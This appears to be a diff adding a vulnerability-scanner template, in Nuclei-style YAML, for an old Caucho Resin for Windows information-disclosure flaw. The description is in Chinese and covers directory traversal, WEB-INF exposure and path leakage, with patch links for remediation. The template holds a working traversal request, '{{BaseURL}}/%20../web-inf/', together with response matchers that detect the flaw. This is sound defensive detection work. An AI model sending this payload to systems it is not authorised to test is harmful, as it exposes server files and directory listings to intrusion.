@@ -1,0 +1,39 @@
+id: resin-cnnvd-200705-315
+info:
+  name: Caucho Resin Information Disclosure
+  author:
+  - l0ne1y
+  tags:
+  - resin
+  - caucho
+  - lfr
+  description: |-
+    Resin for Windows 敏感信息泄漏漏洞
+    Resin是一款由Caucho Technology开发的WEB服务器，可使用在Microsoft Windows操作系统下。
+
+    Resin for Windows实现上存在多个漏洞，远程攻击者可能利用此漏洞非授权获取敏感信息。
+
+    Resin没有正确过滤通过URL传送的输入，允许远程攻击者通过在URL中提供有任意扩展名的DOS设备文件名从系统上的任意COM或LPT设备读取连续的数据流、通过目录遍历攻击泄露Web应用的WEB-INF目录中的文件内容，或通过包含有特殊字符的URL泄露到Caucho Resin服务器的完整系统路径。
+  reference:
+  - http://www.cnnvd.org.cn/web/xxk/ldxqbyid.tag?cnnvd=cnnvd-200705-315
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1.目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
+    http://www.caucho.com/download/resin-pro-3.1.1.tar.gz
+    http://www.caucho.com/download/resin-3.1.1.tar.gz
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    condition: and
+    part: body
+    words:
+    - / ../web-inf/
+    - Directory of /
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/%20../web-inf/'
+  method: GET
